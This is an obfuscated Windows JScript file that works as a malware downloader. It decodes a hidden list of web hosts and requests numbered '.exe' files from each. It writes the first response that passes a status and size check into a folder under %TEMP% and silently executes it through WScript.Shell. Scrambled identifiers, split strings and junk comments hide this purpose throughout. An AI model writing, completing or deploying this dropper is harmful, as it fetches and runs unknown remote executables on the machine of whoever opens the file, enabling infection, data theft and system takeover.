

function coXBuHFnx(rZRjdvEbzxR) {
var JZjTTrZg = WScript.CreateObject("Wscript.Shell");
JZjTTrZg.Run(rZRjdvEbzxR, 0x1, 0x0);
}
function mjFWROBrj(Ubqzl,CLgjI,DJPvR) {
var kDiWy = "DTjoGc xwR pt.Shell doaUPwW Scri".split(" ");
var wBy=((1)?"W" + kDiWy[4]:"")+kDiWy[2];
var IJ = WScript.CreateObject(wBy);
var Pg = "%TEMP%\\";
return IJ.ExpandEnvironmentStrings(Pg);
}
function IrzCfWuj() {
var yUOkBRq = "ipting";
var VwqebpdRxb = "ile";
var UuFnI = "System";
return "Sc" + "r" + yUOkBRq + ".F" + VwqebpdRxb + UuFnI + "Obj" + "ect";
}
function sUsM(WYkwS) {
return WScript.CreateObject(WYkwS);
}
function pSQV(CNJbD,RnVJo) {
CNJbD.write(RnVJo);
}
function lCuV(rZTzl) {
rZTzl.open();
}
function MkBu(aIfBX,dtGxD) {
aIfBX.saveToFile(dtGxD,343-341);
}
function agzJ(yZEhi,vrvLl,DgbTq) {
yZEhi.open(DgbTq,vrvLl,false);
}
function HsXS(OHRcc) {
if (OHRcc == 397-197){return true;} else {return false;}
}
function JbAp(xkwhK) {
if (xkwhK > 153959-456){return true;} else {return false;}
}
function RYqB(wNSoW) {
var AIFKx="";
for(o=(679-679); o < wNSoW.length; o++)
if (o % (130-128) != (403-403)) {
AIFKx += wNSoW.substr(o, 318-317);
}
return AIFKx;
}
function TCmh(KZyCb) {
KZyCb.send();
}
function xWtp(ArPpS) {
return ArPpS.status;
}
function kZjgK(pbrzJW) {
return new ActiveXObject(pbrzJW);
}
var Zx="ZoLhNeBlllLoCwirauJf4fk.pcuoDmK b/S6e94.UejxgeU?B stYhVijsXi2sDihtPslqoqz.xcWo2mU/t6j9a.seIxCeG?I G?K D?1 i?";
var p = RYqB(Zx).split(" ");
var pqk = mjFWROBrj("UhBv","MXUuW","zZlmOI");
var qPi = kZjgK(IrzCfWuj());
var EBja = pqk+"bZzXcXk\\";
try{
qPi.CreateFolder(EBja);
}catch(ZSzrWX){
};
var HTF = "2.XMLH";
var GbI = (HTF + "TTP" + " gYmbxPv KBWsO XML ream St gKhTIFyE AD wQUjjGw OD").split(" ");
var rj = true  , iPlr = GbI[7] + "" + GbI[9];
var kZ = sUsM("MS"+GbI[3]+(14709, GbI[0]));
var dwz = sUsM(iPlr + "B." + GbI[5]+(188877, GbI[4]));
var ZTR = 0;
var S = 1;
var USYjsCk = 729364;
var P=ZTR;
while (true)  {
if(P>=p.length) {break;}
var kK = 0;
var dJG = ("ht" + " YYhGVnU tp JDtEL AAvxhWvI :// LOmMMmM .e xe G ET").split(" ");
try  {
agzJ(kZ,dJG[0]+dJG[2]+dJG[5]+p[P]+S, dJG[9]+dJG[10]); TCmh(kZ); if (HsXS(xWtp(kZ)))  {      
lCuV(dwz); dwz.type = 1; pSQV(dwz,kZ.responseBody); if (JbAp(dwz.size))  {
kK = 1; dwz.position = 0; MkBu(dwz,/*zvU538lk3q*/EBja/*F9L862AeKo*/+USYjsCk+dJG[7]+dJG[8]); try  {
if (((new Date())>0,7646786888)) {
coXBuHFnx(EBja+USYjsCk+/*Gvvh39Lv1u*/dJG[7]+dJG[8]/*4S5q31x31A*/); 
break;
}
}
catch (eS)  {
}; 
}; dwz.close(); 
}; 
if (kK == 1)  {
ZTR = P; break; 
}; 
}
catch (eS)  { 
}; 
P++;
}; 

